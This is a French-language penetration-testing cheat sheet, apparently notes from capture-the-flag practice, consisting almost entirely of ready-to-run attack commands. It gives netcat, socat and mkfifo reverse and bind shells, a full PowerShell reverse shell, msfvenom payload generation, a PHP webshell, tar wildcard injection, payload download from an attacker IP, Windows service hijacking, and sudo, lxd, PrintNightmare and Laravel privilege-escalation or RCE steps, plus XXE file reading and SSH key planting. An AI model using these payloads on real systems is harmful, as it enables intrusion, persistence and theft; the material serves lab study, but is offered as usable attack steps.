## 1) Netcat

#### *Pour un reverse shell*

Pour l'attaquant :

```bash
nc -lvnp <port-number>
```

#### *Pour un bind shell*

Pour l'attaquant :

```bash
nc <IP> <port-number>
```

#### *Pour stabiliser le shell*

Avec python :

Permet d'avoir un shell plus joli.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

Pour donner l'accès aux commandes comme clear, ...

Apres avoir mis le shell en background :

```bash
stty raw -echo; fg
```

Permet d'avoir accès à l'autocomplétion, aux flèches et au Ctrl-C et ensuite met le shell au premier plan.

Pour rénitialiser, il suffit de taper la commande "reset".

## 2) Rlwrap

Même technique que pour netcat en utilisant rlwrap devant la commande nc. Il est utilisé notamment pour les machines windows.

## 3) Socat

Pour écouter :

```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

Pour se connecter :

```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- pty : Alloue un pseudo terminal sur la cible
- stderr : Toutes les erreurs sont affichés sur le shell
- sigint : Active les Ctrl-C
- setsid : crée le processus dans une nouvelle session
- sane : Essaye de stabiliser le shell

#### *Ecrypted shell with Socat*

Tout d'abord, il faudra crée un certificat auto-signé avec OpenSSL.

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Ensuite on va regrouper le fichier .key et le fichier .crt en un seul fichier .pem

```bash
cat shell.key shell.crt > shell.pem
```

Pour écouter :

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

Pour se connecter :

```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

Combinaison des deux techniques :

```bash
socat OPENSSL-LISTEN:<PORT>,cert=<FILE.pem>,verify=0 FILE:`tty`,raw,echo=0
```

et pour se connecter : 

```bash
socat openssl:<IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## 4) Common Payload

Pour écouter (bind shell) :

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Pour se connecter (reverse shell) :

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

## 5) Pour les Windows Server

Il faut écouter avec une des techniques de reverse shell précédentes et :

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

En modifiant l'IP et le port.

## 6) Msfvenom

Pour générer un reverse shell Windows :

```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

- -f : Choisi le format
- -o : Choisi le nom du fichier output

Les shells sont divisés en 2 catégories, les staged et les stageless :

- Staged : Le payload est envoyé en 2 parties. La première est appelée le stager. C'est la partie qui est exécutée directement par le serveur pour se connecter à un listener. Mais il ne contient pas de reverse shell dans son code. Il utilisera la connection pour charger le vrai payload et l'exécuter.
- Stageless : Le payload est envoyé entièrement avec le reverse_shell

## 7) Webshell

Un exemple de commande pour avoir un webshell :

```bash
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

## 8) Shell avec tar

Si une tâche est effectué dans qui nécessite l'utilisation de tar, alors on peut faire ce shell.

Tout d'abord :

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/<attack ip>/<port> 0>&1' > /var/www/html/shell
```

Pour permettre l'exécution du script :

```bash
chmod +x /var/www/html/shell
```

```bash
touch /var/www/html/--checkpoint=1
ou avec echo "" >
```

```bash
touch /var/www/html/--checkpoint-action=exec=bash\ shell
ou avec echo "" >
```

Lancer un listener sur votre machine avec le port spécifier :

```bash
nc -lvnp <port>
```

## 9) Trouver les permissions

```bash
getcap -r / 2>/dev/null
```

```bash
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
```

```bash
sudo -l
```

## 10) Download un shell Windows

```powershell
powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://10.11.53.14:8888/reverse.exe','shell.exe')"
```

## 11) ltrace

Ne pas oublier cette commande pour afficher les appels des applications.

## 12) Groupe

Ne pas oublier de regarder les groupes avec la commande id.

## 13) SSH Forwarding

ssh -i key -L <port-local>:127.0.0.1:<port-distant> strapi@horizontall.htb

## 14) PrivEsc

Insecure Service Permissions :
```powershell
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```
Si l'utilisateur a le SERVICE_CHANGE_CONFIG de permis alors OK :
```powershell
sc qc daclsvc
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```
Ensuite start un listener sur la machine :
```bash
nc -lvnp 1234
```

Et apres lancer le service avec le chemin modifier :
```powershell
net start daclsvc
```
---
Quand les groupes de l'utilisateur permet de lancer et stopper des services :
```powershell
sc.exe config <services> binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2
1234"
sc.exe stop <services>
sc.exe start <services>
```
---
Sudo Buffer Overflow vérif (*CVE-2021-3156*):
```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```
Si return : Malloc() memory corruption... -> vulnérable
---
Les versions de sudo < 1.8.28 :
```bash
sudo -u#-1 <command>
```
---
*CVE-2019-18634*
Si dans le fichier /etc/sudoers, le pwfeedback est activé -> vulnérable :
PoC
```bash
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
```
S'il y a une Segmentation fault -> vulnérable
Dowload le exploit.c et le compiler puis l'upload sur la victime et le lancer.
[CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)
---
Avec screen d'activer :

```bash
/usr/bin/screen -x root/root
```
---
Avec le groupe lxd :

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image

lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

lxc start privesc
lxc exec privesc /bin/sh
~# cd /mnt/root #Here is where the filesystem is mounted
```
---
PrintNightmare (CVE-2021-1675), avoir avoir download la CVE sur la victime : 

```powershell
Import-Module .\CVE-2021-1675.ps1
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
Invoke-Nightmare -NewUser "<User>" -NewPassword "<password>"
```
---
Laravelv8 (CVE-2021-3129), après avoir fait un port forwarding SSH:

```bash
./exploit.py <localhost:port> Monolog/RCE1 "<cmd>"
```
---
Faire crash un programme (si valgrind est dans le répertoire = indice) :

```bash
<lancer le programme>
<mettre le chemin que vous voulez voir>
Ctrl+Z -> background
ps -> déterminer le PID du processus
kill -BUS <PID>
fg
apparaitre -> bus error (core dumped)
apport-unpack <chemin de vos crash> <chemin pour les extraires>
strings du CoreDump
```
---
OverlayFS *CVE-2021-3493* :
```bash
cat /etc/os-release
```
Permet de voir la version de l'os.
Les versions affactées sont : *Ubuntu 20.10,Ubuntu 20.04 LTS,Ubuntu 18.04 LTS,Ubuntu 16.04 LTS, Ubuntu 14.04 ESM*
Ensuite aller voir sur ce site pour la PoC : [CVE-2021-3493](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/)
---

## 15) Foothold

XXE :

```bash
<?xml
version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-
encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>&file;</reward>
</bugreport>
```
Pour transformer en format url b64 :
```bash
cat <fichier> | base64 -w 0
```
---

Faire un diff sur les différents commit d'un dossier Git : 

```bash
git diff HEAD~<Number>
```
---
Avoir un webshell -> reverse shell :

```bash
curl -H "<Header>" "<url>" -G --data-urlencode "...;mkdir -p /home/<user>/.ssh; echo <clé pub> >> /home/<user>/.ssh/authorized_keys"
ssh -i <clé privée> <user>@<ip>
```
---

## 16) Pivoting 

Commande bash pour scan les IPs disponible :

```bash
for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
```

Commande bash pour scan les ports ouverts :

```bash
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```